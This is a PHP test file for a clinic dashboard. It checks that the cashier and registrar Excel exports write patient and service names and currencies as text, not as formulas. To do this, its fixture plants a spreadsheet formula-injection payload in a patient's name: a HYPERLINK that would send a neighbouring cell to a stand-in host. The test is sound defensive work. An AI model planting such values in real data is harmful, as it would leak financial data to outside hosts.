<?php

use App\Models\Patient;
use App\Models\PatientService;
use App\Models\Service;
use Illuminate\Testing\TestResponse;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

use function Pest\Laravel\actingAs;

/*
| Excel evaluates a cell that starts with "=" as a formula when the file is opened. Free text typed
| into the dashboard (a patient's or a catalogue item's name, a currency) must reach the exports as
| text: a planted HYPERLINK would send the neighbouring cells of a financial sheet to another host.
*/

beforeEach(function (): void {
    // The patient's full name, "{last} {first} {middle}", becomes =HYPERLINK(...)&" Иван".
    $this->patient = Patient::factory()->create([
        'last_name' => '=HYPERLINK("http://example.invalid/?x="&C2,"Открыть")&"',
        'first_name' => 'Иван"',
        'middle_name' => null,
    ]);
    $this->service = Service::factory()->create(['name' => '=1+1', 'price' => '99000.00', 'currency' => '=2+2']);
});

function downloadedSheet(TestResponse $response): Worksheet
{
    return IOFactory::load($response->assertOk()->baseResponse->getFile()->getPathname())->getActiveSheet();
}

/**
 * @param  array<string, string>  $texts  cell => the text it must hold
 */
function expectTextCells(Worksheet $sheet, array $texts): void
{
    foreach ($texts as $cell => $text) {
        expect($sheet->getCell($cell)->getDataType())->toBe(DataType::TYPE_STRING, "{$cell} is not text")
            ->and($sheet->getCell($cell)->getValue())->toBe($text);
    }
}

it('writes the names and currencies of the cashier export as text, and its prices as numbers', function (): void {
    PatientService::factory()->confirmed()->for($this->patient)->for($this->service)->create();

    $sheet = downloadedSheet(actingAs(adminWithPermissions('view_cashier'), 'admin')->get(route('cashier.export')));

    // C service, D patient, G currency of the row; G3 the currency of the totals row.
    expectTextCells($sheet, [
        'C2' => '=1+1',
        'D2' => '=HYPERLINK("http://example.invalid/?x="&C2,"Открыть")&" Иван"',
        'G2' => '=2+2',
        'G3' => '=2+2',
    ]);
    expect($sheet->getCell('F2')->getDataType())->toBe(DataType::TYPE_NUMERIC)
        ->and($sheet->getCell('F3')->getDataType())->toBe(DataType::TYPE_NUMERIC);
});

it('writes the names and currencies of the registrar export as text, and its prices as numbers', function (): void {
    PatientService::factory()->for($this->patient)->for($this->service)->create(['status' => 'assigned']);

    $sheet = downloadedSheet(actingAs(adminWithPermissions('view_patients'), 'admin')->get(route('registrar.export', $this->patient)));

    // C name, E currency of the row; E3 the currency of the totals row.
    expectTextCells($sheet, ['C2' => '=1+1', 'E2' => '=2+2', 'E3' => '=2+2']);
    expect($sheet->getCell('D2')->getDataType())->toBe(DataType::TYPE_NUMERIC)
        ->and($sheet->getCell('D3')->getDataType())->toBe(DataType::TYPE_NUMERIC);
});
